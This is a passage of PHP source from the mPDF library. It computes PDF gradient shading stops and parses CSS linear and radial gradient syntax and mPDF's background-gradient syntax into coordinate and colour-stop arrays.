	if (!isset($stops[(count($stops)-1)]['offset'])) { $stops[(count($stops)-1)]['offset'] = 1; }

	// Fix stop-offsets set as absolute lengths
	if ($type==2) {
		$axisx = ($coords[2]-$coords[0])*$usew;
		$axisy = ($coords[3]-$coords[1])*$useh;
		$axis_length = sqrt(pow($axisx,2) + pow($axisy,2));
	}
	else { $axis_length = $coords[4]*$usew; }	// Absolute lengths are meaningless for an ellipse - Firefox uses Width as reference

	for($i=0;$i<count($stops);$i++) {
	  if (isset($stops[$i]['offset']) && preg_match('/([0-9.]+(px|em|ex|pc|pt|cm|mm|in))/i',$stops[$i]['offset'],$m)) { 
		$tmp = $this->mpdf->ConvertSize($m[1],$this->mpdf->w,$this->mpdf->FontSize,false);
		$stops[$i]['offset'] = $tmp/$axis_length;
	  }
	}


	if (isset($stops[0]['offset']) && $stops[0]['offset']>0) { 
		$firststop = $stops[0]; 
		$firststop['offset'] = 0;
		array_unshift($stops, $firststop); 
	}
	if (!$repeat && isset($stops[(count($stops)-1)]['offset']) && $stops[(count($stops)-1)]['offset']<1) {
		$endstop = $stops[(count($stops)-1)]; 
		$endstop['offset'] = 1;
		$stops[] = $endstop; 
	}
	if ($stops[0]['offset'] > $stops[(count($stops)-1)]['offset']) { 
		$stops[0]['offset'] = 0;
		$stops[(count($stops)-1)]['offset'] = 1;
	}

	for($i=0;$i<count($stops);$i++) {
		// mPDF 5.3.74
		if ($colorspace == 'CMYK') {
			$this->mpdf->gradients[$n]['stops'][$i]['col'] = sprintf('%.3F %.3F %.3F %.3F', (ord($stops[$i]['col']{1})/100), (ord($stops[$i]['col']{2})/100), (ord($stops[$i]['col']{3})/100), (ord($stops[$i]['col']{4})/100));
		}
		else if ($colorspace == 'Gray') {
			$this->mpdf->gradients[$n]['stops'][$i]['col'] = sprintf('%.3F', (ord($stops[$i]['col']{1})/255));
		}
		else {
			$this->mpdf->gradients[$n]['stops'][$i]['col'] = sprintf('%.3F %.3F %.3F', (ord($stops[$i]['col']{1})/255), (ord($stops[$i]['col']{2})/255), (ord($stops[$i]['col']{3})/255));
		}
		if (!isset($stops[$i]['opacity'])) { $stops[$i]['opacity'] = 1; } 
		else if ($stops[$i]['opacity'] > 1 || $stops[$i]['opacity'] < 0) { $stops[$i]['opacity'] = 1; } 
		else if ($stops[$i]['opacity'] < 1) { 
			$trans = true; 
		}
		$this->mpdf->gradients[$n]['stops'][$i]['opacity'] = $stops[$i]['opacity'];
		// OFFSET
		if ($i>0 && $i<(count($stops)-1)) {
		  if (!isset($stops[$i]['offset']) || (isset($stops[$i+1]['offset']) && $stops[$i]['offset']>$stops[$i+1]['offset']) || $stops[$i]['offset']<$stops[$i-1]['offset']) { 
			if (isset($stops[$i-1]['offset']) && isset($stops[$i+1]['offset'])) { 
				$stops[$i]['offset'] = ($stops[$i-1]['offset']+$stops[$i+1]['offset'])/2; 
			}
			else {
				for($j=($i+1);$j<count($stops);$j++) {
					if(isset($stops[$j]['offset'])) { break; }
				}
				$int = ($stops[$j]['offset'] - $stops[($i-1)]['offset'])/($j-$i+1);
				for($f=0;$f<($j-$i-1);$f++) {
					$stops[($i+$f)]['offset'] = $stops[($i+$f-1)]['offset'] + ($int);
				}
			}
		  }
		}
		$this->mpdf->gradients[$n]['stops'][$i]['offset'] = $stops[$i]['offset'];
		$this->mpdf->gradients[$n]['stops'][$i]['offset'] = $stops[$i]['offset'];
	}

	if ($repeat) {
		$ns = count($this->mpdf->gradients[$n]['stops']);
		$offs = array();
		for($i=0;$i<$ns;$i++) {
			$offs[$i] = $this->mpdf->gradients[$n]['stops'][$i]['offset'];
		}
		$gp = 0;
		$inside=true;
		while($inside) {
		   $gp++;
		   for($i=0;$i<$ns;$i++) {
			$this->mpdf->gradients[$n]['stops'][(($ns*$gp)+$i)] = $this->mpdf->gradients[$n]['stops'][(($ns*($gp-1))+$i)];
			$tmp = $this->mpdf->gradients[$n]['stops'][(($ns*($gp-1))+($ns-1))]['offset']+$offs[$i] ;
			if ($tmp < 1) { $this->mpdf->gradients[$n]['stops'][(($ns*$gp)+$i)]['offset'] = $tmp; }
			else {
				$this->mpdf->gradients[$n]['stops'][(($ns*$gp)+$i)]['offset'] = 1;
				$inside = false;
				break(2);
			}
		   }
		}
	}

	if ($trans) { 
		$this->mpdf->gradients[$n]['trans'] = true;	
		$s .= ' /TGS'.$n.' gs ';
	}
	if (!is_array($extend) || count($extend) <1) { 
		$extend=array('true', 'true');	// These are supposed to be quoted - appear in PDF file as text
	}
	$this->mpdf->gradients[$n]['coords'] = $coords;
	$this->mpdf->gradients[$n]['extend'] = $extend;
	//paint the gradient
	$s .= '/Sh'.$n.' sh '."\n";
	//restore previous Graphic State
	$s .= ' Q '."\n";
	if ($return) { return $s; }
	else { $this->mpdf->_out($s); }
}


function parseMozGradient($bg) {
   //	background[-image]: -moz-linear-gradient(left, #c7Fdde 20%, #FF0000 ); 
   //	background[-image]: linear-gradient(left, #c7Fdde 20%, #FF0000 ); // CSS3
   if (preg_match('/repeating-/',$bg)) { $repeat = true; }
   else { $repeat = false; }
   if (preg_match('/linear-gradient\((.*)\)/',$bg,$m)) {
	$g = array();
	$g['type'] = 2;
	$g['colorspace'] = 'RGB';
	$g['extend'] = array('true','true');
	$v = trim($m[1]);
	// Change commas inside e.g. rgb(x,x,x)
	while(preg_match('/(\([^\)]*?),/',$v)) { $v = preg_replace('/(\([^\)]*?),/','\\1@',$v); }
	// Remove spaces inside e.g. rgb(x, x, x)
	while(preg_match('/(\([^\)]*?)[ ]/',$v)) { $v = preg_replace('/(\([^\)]*?)[ ]/','\\1',$v); }
	$bgr = preg_split('/\s*,\s*/',$v);
	for($i=0;$i<count($bgr);$i++) { $bgr[$i] = preg_replace('/@/', ',', $bgr[$i]); }
	// Is first part $bgr[0] a valid point/angle?
	$first = preg_split('/\s+/',trim($bgr[0]));
	if (preg_match('/(left|center|right|bottom|top|deg|grad|rad)/i',$bgr[0]) && !preg_match('/(<#|rgb|rgba|hsl|hsla)/i',$bgr[0])) {
		$startStops = 1; 
	}
	else if (trim($first[(count($first)-1)]) === "0") {
		$startStops = 1;
	}
	else {
		$check = $this->mpdf->ConvertColor($first[0]);
		if ($check) $startStops = 0; 
		else $startStops = 1; 
	}
	// first part a valid point/angle?
	if ($startStops == 1) {	// default values
		// [<point> || <angle>,] = [<% em px left center right bottom top> || <deg grad rad 0>,]
		if (preg_match('/([\-]*[0-9\.]+)(deg|grad|rad)/i',$bgr[0],$m)) {
			$angle = $m[1] + 0;
			if (strtolower($m[2])=='deg') { $angle = $angle; }
			else if (strtolower($m[2])=='grad') { $angle *= (360/400); }
			else if (strtolower($m[2])=='rad') { $angle = rad2deg($angle); }
			while($angle < 0) { $angle += 360; }
			$angle = ($angle % 360);
		}
		else if (trim($first[(count($first)-1)]) === "0") { $angle = 0; }
		if (preg_match('/left/i',$bgr[0])) { $startx = 0; }
		else if (preg_match('/right/i',$bgr[0])) { $startx = 1; }
		if (preg_match('/top/i',$bgr[0])) { $starty = 1; }
		else if (preg_match('/bottom/i',$bgr[0])) { $starty = 0; }
		// Check for %? ?% or %%
		if (preg_match('/(\d+)[%]/i',$first[0],$m)) { $startx = $m[1]/100; }
		else if (!isset($startx) && preg_match('/([0-9.]+(px|em|ex|pc|pt|cm|mm|in))/i',$first[0],$m)) { 
			$tmp = $this->mpdf->ConvertSize($m[1],$this->mpdf->w,$this->mpdf->FontSize,false);
			if ($tmp) { $startx = $m[1]; }
		}
		if (isset($first[1]) && preg_match('/(\d+)[%]/i',$first[1],$m)) { $starty = 1 - ($m[1]/100); }
		else if (!isset($starty) && isset($first[1]) && preg_match('/([0-9.]+(px|em|ex|pc|pt|cm|mm|in))/i',$first[1],$m)) { 
			$tmp = $this->mpdf->ConvertSize($m[1],$this->mpdf->w,$this->mpdf->FontSize,false);
			if ($tmp) { $starty = $m[1]; }
		}
		if (isset($startx) && !isset($starty)) { $starty = 0.5; }
		if (!isset($startx) && isset($starty)) { $startx = 0.5; }

	}
	// If neither a <point> or <angle> is specified, i.e. the entire function consists of only <stop> values, the gradient axis starts from the top of the box and runs vertically downwards, ending at the bottom of the box.
	else {	// default values T2B
		$starty = 1; $startx = 0.5;
		$endy = 0; $endx = 0.5;
	}
	$coords = array();
	if (!isset($startx)) { $startx = false; }
	if (!isset($starty)) { $starty = false; }
	if (!isset($endx)) { $endx = false; }
	if (!isset($endy)) { $endy = false; }
	if (!isset($angle)) { $angle = false; }
	$g['coords'] = array($startx ,$starty ,$endx ,$endy, $angle, $repeat );
	$g['stops'] = array();
	for($i=$startStops;$i<count($bgr);$i++) {
		$stop = array();
		// parse stops
		$el = preg_split('/\s+/',trim($bgr[$i]));
		// mPDF 5.3.74
		$col = $this->mpdf->ConvertColor($el[0]);
		if ($col) { $stop['col'] = $col; }
		else { $stop['col'] = $col = $this->mpdf->ConvertColor(255); }
		if ($col{0}==1) $g['colorspace'] = 'Gray';
		else if ($col{0}==4 || $col{0}==6) $g['colorspace'] = 'CMYK';
		if ($col{0}==5) { $stop['opacity'] = ord($col{4})/100; }	// transparency from rgba()
		else if ($col{0}==6) { $stop['opacity'] = ord($col{5})/100; }	// transparency from cmyka()
		else if ($col{0}==1 && $col{2}==1) { $stop['opacity'] = ord($col{3})/100; }	// transparency converted from rgba or cmyka()

		if (isset($el[1]) && preg_match('/(\d+)[%]/',$el[1],$m)) { 
			$stop['offset'] = $m[1]/100;
			if ($stop['offset']>1) { unset($stop['offset']); }
		}
		else if (isset($el[1]) && preg_match('/([0-9.]+(px|em|ex|pc|pt|cm|mm|in))/i',$el[1],$m)) { 
			$tmp = $this->mpdf->ConvertSize($m[1],$this->mpdf->w,$this->mpdf->FontSize,false);
			if ($tmp) { $stop['offset'] = $m[1]; }
		}
		$g['stops'][] = $stop;
	}
	if (count($g['stops'] )) { return $g; }
   }
   else if (preg_match('/radial-gradient\((.*)\)/',$bg,$m)) {
	$g = array();
	$g['type'] = 3;
	$g['colorspace'] = 'RGB';
	$g['extend'] = array('true','true');
	$v = trim($m[1]);
	// Change commas inside e.g. rgb(x,x,x)
	while(preg_match('/(\([^\)]*?),/',$v)) { $v = preg_replace('/(\([^\)]*?),/','\\1@',$v); }
	// Remove spaces inside e.g. rgb(x, x, x)
	while(preg_match('/(\([^\)]*?)[ ]/',$v)) { $v = preg_replace('/(\([^\)]*?)[ ]/','\\1',$v); }
	$bgr = preg_split('/\s*,\s*/',$v);
	for($i=0;$i<count($bgr);$i++) { $bgr[$i] = preg_replace('/@/', ',', $bgr[$i]); }

	// Is first part $bgr[0] a valid point/angle?
	$startStops = 0; 
	$pos_angle = false;
	$shape_size = false;
	$first = preg_split('/\s+/',trim($bgr[0]));
	$checkCol = $this->mpdf->ConvertColor($first[0]);
	if (preg_match('/(left|center|right|bottom|top|deg|grad|rad)/i',$bgr[0]) && !preg_match('/(<#|rgb|rgba|hsl|hsla)/i',$bgr[0])) {
		$startStops=1; 
		$pos_angle = $bgr[0];
	}
	else if (trim($first[(count($first)-1)]) === "0") {
		$startStops=1;
		$pos_angle = $bgr[0];
	}
	else if (preg_match('/(circle|ellipse|closest-side|closest-corner|farthest-side|farthest-corner|contain|cover)/i',$bgr[0])) {
		$startStops=1; 
		$shape_size = $bgr[0];
	}
	else if (!$checkCol) {
		$startStops=1;
 		$pos_angle = $bgr[0];
	}
	if (preg_match('/(circle|ellipse|closest-side|closest-corner|farthest-side|farthest-corner|contain|cover)/i',$bgr[1])) {
		$startStops=2; 
		$shape_size = $bgr[1];
	}

	// If valid point/angle?
	if ($pos_angle) {	// default values
		// [<point> || <angle>,] = [<% em px left center right bottom top> || <deg grad rad 0>,]
		if (preg_match('/left/i',$pos_angle)) { $startx = 0; }
		else if (preg_match('/right/i',$pos_angle)) { $startx = 1; }
		if (preg_match('/top/i',$pos_angle)) { $starty = 1; }
		else if (preg_match('/bottom/i',$pos_angle)) { $starty = 0; }
		// Check for %? ?% or %%
		if (preg_match('/(\d+)[%]/i',$first[0],$m)) { $startx = $m[1]/100; }
		else if (!isset($startx) && preg_match('/([0-9.]+(px|em|ex|pc|pt|cm|mm|in))/i',$first[0],$m)) { 
			$tmp = $this->mpdf->ConvertSize($m[1],$this->mpdf->w,$this->mpdf->FontSize,false);
			if ($tmp) { $startx = $m[1]; }
		}
		if (isset($first[1]) && preg_match('/(\d+)[%]/i',$first[1],$m)) { $starty = 1 - ($m[1]/100); }
		else if (!isset($starty) && isset($first[1]) && preg_match('/([0-9.]+(px|em|ex|pc|pt|cm|mm|in))/i',$first[1],$m)) { 
			$tmp = $this->mpdf->ConvertSize($m[1],$this->mpdf->w,$this->mpdf->FontSize,false);
			if ($tmp) { $starty = $m[1]; }
		}

/*
		// ?? Angle has no effect in radial gradient (does not exist in CSS3 spec.)
		if (preg_match('/([\-]*[0-9\.]+)(deg|grad|rad)/i',$pos_angle,$m)) {
			$angle = $m[1] + 0;
			if (strtolower($m[2])=='deg') { $angle = $angle; }
			else if (strtolower($m[2])=='grad') { $angle *= (360/400); }
			else if (strtolower($m[2])=='rad') { $angle = rad2deg($angle); }
			while($angle < 0) { $angle += 360; }
			$angle = ($angle % 360);
		}
*/
		if (!isset($starty)) { $starty = 0.5; }
		if (!isset($startx)) { $startx = 0.5; }

	}
	// If neither a <point> or <angle> is specified, i.e. the entire function consists of only <stop> values, the gradient axis starts from the top of the box and runs vertically downwards, ending at the bottom of the box.
	else {	// default values Center
		$starty = 0.5; $startx = 0.5;
		$endy = 0.5; $endx = 0.5;
	}

	// If valid shape/size?
	$shape = 'ellipse';	// default
	$size = 'farthest-corner';	// default
	if ($shape_size) {	// default values
		if (preg_match('/(circle|ellipse)/i',$shape_size, $m)) {
			$shape = $m[1];
		}
		if (preg_match('/(closest-side|closest-corner|farthest-side|farthest-corner|contain|cover)/i',$shape_size, $m)) {
			$size = $m[1];
			if ($size=='contain') { $size = 'closest-side'; }
			else if ($size=='cover') { $size = 'farthest-corner'; }
		}
	}

	$coords = array();
	if (!isset($startx)) { $startx = false; }
	if (!isset($starty)) { $starty = false; }
	if (!isset($endx)) { $endx = false; }
	if (!isset($endy)) { $endy = false; }
	if (!isset($radius)) { $radius = false; }
	if (!isset($angle)) { $angle = 0; }
	$g['coords'] = array($startx ,$starty ,$endx ,$endy, $radius, $angle, $shape, $size, $repeat );

	$g['stops'] = array();
	for($i=$startStops;$i<count($bgr);$i++) {
		$stop = array();
		// parse stops
		$el = preg_split('/\s+/',trim($bgr[$i]));
		// mPDF 5.3.74
		$col = $this->mpdf->ConvertColor($el[0]);
		if ($col) { $stop['col'] = $col; }
		else { $stop['col'] = $col = $this->mpdf->ConvertColor(255); }
		if ($col{0}==1) $g['colorspace'] = 'Gray';
		else if ($col{0}==4 || $col{0}==6) $g['colorspace'] = 'CMYK';
		if ($col{0}==5) { $stop['opacity'] = ord($col{4})/100; }	// transparency from rgba()
		else if ($col{0}==6) { $stop['opacity'] = ord($col{5})/100; }	// transparency from cmyka()
		else if ($col{0}==1 && $col{2}==1) { $stop['opacity'] = ord($col{3})/100; }	// transparency converted from rgba or cmyka()

		if (isset($el[1]) && preg_match('/(\d+)[%]/',$el[1],$m)) { 
			$stop['offset'] = $m[1]/100;
			if ($stop['offset']>1) { unset($stop['offset']); }
		}
		else if (isset($el[1]) && preg_match('/([0-9.]+(px|em|ex|pc|pt|cm|mm|in))/i',$el[1],$m)) { 
			$tmp = $this->mpdf->ConvertSize($m[1],$this->mpdf->w,$this->mpdf->FontSize,false);
			$stop['offset'] = $el[1];
		}
		$g['stops'][] = $stop;
	}
	if (count($g['stops'] )) { return $g; }
   }
   return array();
} 

function parseBackgroundGradient($bg) {
	// background-gradient: linear #00FFFF #FFFF00 0 0.5 1 0.5;  or
	// background-gradient: radial #00FFFF #FFFF00 0.5 0.5 1 1 1.2;

	$v = trim($bg);
	$bgr = preg_split('/\s+/',$v);
	$g = array();
	if (count($bgr)> 6) {  
		if (strtoupper(substr($bgr[0],0,1)) == 'L' && count($bgr)==7) {  // linear
			$g['type'] = 2;
			//$coords = array(0,0,1,1 );	// 0 0 1 0 or 0 1 1 1 is L 2 R; 1,1,0,1 is R2L; 1,1,1,0 is T2B; 1,0,1,1 is B2T
			// Linear: $coords - array of the form (x1, y1, x2, y2) which defines the gradient vector (see linear_gradient_coords.jpg). 
			//    The default value is from left to right (x1=0, y1=0, x2=1, y2=0).
			$g['coords'] = array($bgr[3], $bgr[4], $bgr[5], $bgr[6]);
		}
		else if (count($bgr)==8) {	// radial
			$g['type'] = 3;
			// Radial: $coords - array of the form (fx, fy, cx, cy, r) where (fx, fy) is the starting point of the gradient with color1, 
			//    (cx, cy) is the center of the circle with color2, and r is the radius of the circle (see radial_gradient_coords.jpg). 
			//    (fx, fy) should be inside the circle, otherwise some areas will not be defined
			$g['coords'] = array($bgr[3], $bgr[4], $bgr[5], $bgr[6], $bgr[7]);
		}
		$g['colorspace'] = 'RGB';
		// mPDF 5.3.74
		$cor = $this->mpdf->ConvertColor($bgr[1]);
		if ($cor{0}==1) $g['colorspace'] = 'Gray';
		else if ($cor{0}==4 || $cor{0}==6) $g['colorspace'] = 'CMYK';
		if ($cor) { $g['col'] = $cor; }
		else { $g['col'] = $this->mpdf->ConvertColor(255); }
		$cor = $this->mpdf->ConvertColor($bgr[2]);
		if ($cor) { $g['col2'] = $cor; }
		else { $g['col2'] = $this->mpdf->ConvertColor(255); }
		$g['extend'] = array('true','true');
		$g['stops'] = array(array('col'=>$g['col'], 'opacity'=>1, 'offset'=>0), array('col'=>$g['col2'], 'opacity'=>1, 'offset'=>1));
		return $g;
	}
	return false;
}



}

?>